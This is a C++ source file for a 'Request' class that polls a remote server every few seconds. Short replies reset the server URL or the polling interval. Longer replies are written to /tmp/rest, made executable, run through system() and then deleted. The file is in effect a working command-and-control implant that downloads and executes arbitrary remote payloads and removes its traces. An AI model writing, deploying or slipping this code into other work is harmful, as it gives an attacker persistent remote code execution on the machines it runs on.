#include "../../include/target.hpp"
#include <iostream>
#include <fstream>
#include <cstdio>
#include <string>
#include <regex>
#include <unistd.h>
#include <curl/curl.h>
#include <sys/stat.h>

using namespace std;
Request::Request()
{
    this->SetDistPath();
    this->srcPath =  "/tmp/rest";
    this->duration = 2;
}


int Request::Circle() {
    while (true) {
        sleep(this->duration);
        this->Send();
    }
    return 1;
}

void Request::SetDistPath() {
    this->distPath =  "/tmp/res";
}

int Request::HandleExecute()
{
    string exComStr = this->srcPath;
    int res = system(exComStr.c_str());
    if (res != 0)
    {
        return 1;
    }
    return 0;
}

void Request::WriteResponse(string readBuffer)
{
    ofstream file (this->srcPath, ios::out);
    file << readBuffer;
    file.close();
}

void Request::ChangePerms()
{
    string prComStr = "chmod 744 ";
    string comStr = prComStr + this->srcPath;
    system(comStr.c_str());
}

int Request::Send()
{
    string readBuffer = this->GetData();
    const regex reURL("^https?://.+");
    const regex reDu("^duration-[0-9]+");
    if (readBuffer.size() < 100)
    {
        if (regex_match(readBuffer, reURL))
        {
            string oldUrl = this->url;
            this->url = readBuffer;
            string data = this->GetData();
            if (data == "") 
            {
                this->url = oldUrl;
                this->SendData(this->ERROR + "01" + "new url have empty response");
            }
        }
        else if (regex_match(readBuffer, reDu))
        {
            string *buf = &readBuffer;
            string from = "duration-";
            size_t start_pos = buf->find(from);
            buf->replace(start_pos, from.length(), "");
            this->duration = atoi(buf->c_str());
        } 
    }
    else
    {
        this->WriteResponse(readBuffer);
        this->ChangePerms();
        this->HandleExecute();
        remove(this->srcPath.c_str());
    }
    return 0;
}


